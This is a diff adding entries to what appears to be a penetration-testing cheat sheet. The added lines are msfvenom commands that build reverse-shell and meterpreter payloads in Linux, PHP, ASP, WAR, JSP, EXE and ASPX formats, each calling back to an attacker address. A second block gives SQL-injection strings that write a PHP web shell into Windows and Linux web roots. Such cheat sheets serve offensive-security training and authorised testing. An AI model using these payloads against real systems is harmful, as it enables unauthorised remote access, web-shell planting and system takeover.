@@ -77,6 +77,31 @@ For all shellcode see ‘msfvenom –help-formats’ for information as to valid
 	
 	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f <[LANGUAGE]>
 
+```
+#Linux
+•msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
+# PHP
+•msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
+# ASP
+•msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.216 LPORT=443 -f asp > shell.asp
+# WAR
+•msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
+# JSP
+•msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
+# Exe
+•msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
+# ASPX
+•msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f aspx > shell.aspx
+# ASPX-x64 
+•msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1234 -f aspx > 4.aspx
+```
+
+# Shell From SQL Injection
+•windows
+?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+•linux
+?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+
 # Staged vs Non-Staged Payloads
 
 <b>Staged payload:</b> (useful for bof) (need multi_handler metasploit in order to works)
